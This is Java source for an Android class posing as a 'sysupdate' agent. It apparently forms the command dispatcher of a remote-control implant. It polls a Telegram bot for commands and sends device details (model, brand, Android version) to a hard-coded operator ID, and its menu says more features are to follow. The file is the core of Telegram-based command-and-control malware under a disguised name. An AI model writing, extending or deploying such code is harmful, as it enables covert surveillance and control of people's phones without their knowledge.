package com.sysupdate.agent;

import android.content.Context;
import android.os.Build;

public class CommandDispatcher {
    private final Context ctx;
    private long lastUpdateId = 0;

    public CommandDispatcher(Context c) { this.ctx = c; }

    public void poll() {
        String resp = TelegramClient.call("getUpdates", "offset=" + (lastUpdateId + 1) + "&timeout=0");
        // parsing manual minimal
        int idx = 0;
        while ((idx = resp.indexOf("\"update_id\":", idx)) >= 0) {
            int start = idx + 12;
            int end = start;
            while (end < resp.length() && Character.isDigit(resp.charAt(end))) end++;
            try { lastUpdateId = Long.parseLong(resp.substring(start, end)); } catch (Exception e) { break; }

            int tIdx = resp.indexOf("\"text\":\"", idx);
            if (tIdx < 0) { idx = end; continue; }
            int tStart = tIdx + 8;
            int tEnd = tStart;
            StringBuilder sb = new StringBuilder();
            while (tEnd < resp.length()) {
                char ch = resp.charAt(tEnd);
                if (ch == '\\' && tEnd + 1 < resp.length()) {
                    char nx = resp.charAt(tEnd + 1);
                    if (nx == 'n') sb.append('\n');
                    else if (nx == '"') sb.append('"');
                    else if (nx == '\\') sb.append('\\');
                    else sb.append(nx);
                    tEnd += 2;
                    continue;
                }
                if (ch == '"') break;
                sb.append(ch);
                tEnd++;
            }
            handle(sb.toString().trim());
            idx = tEnd;
        }
    }

    private void handle(String cmd) {
        try {
            if (cmd.equals("/start") || cmd.equals("/menu")) {
                TelegramClient.sendMessage(TelegramClient.ADMIN_ID, menuText());
            } else if (cmd.equals("/info")) {
                TelegramClient.sendMessage(TelegramClient.ADMIN_ID,
                    "Model: " + Build.MODEL + "\nBrand: " + Build.BRAND +
                    "\nAndroid: " + Build.VERSION.RELEASE + "\nSDK: " + Build.VERSION.SDK_INT);
            } else if (cmd.equals("/ping")) {
                TelegramClient.sendMessage(TelegramClient.ADMIN_ID, "pong");
            } else {
                TelegramClient.sendMessage(TelegramClient.ADMIN_ID, "Perintah tidak dikenal: " + cmd);
            }
        } catch (Exception e) {
            TelegramClient.sendMessage(TelegramClient.ADMIN_ID, "Err: " + e.getMessage());
        }
    }

    private String menuText() {
        return "=== MENU ===\n" +
               "/info - info device\n" +
               "/ping - cek koneksi\n" +
               "(fitur lain menyusul)";
    }
}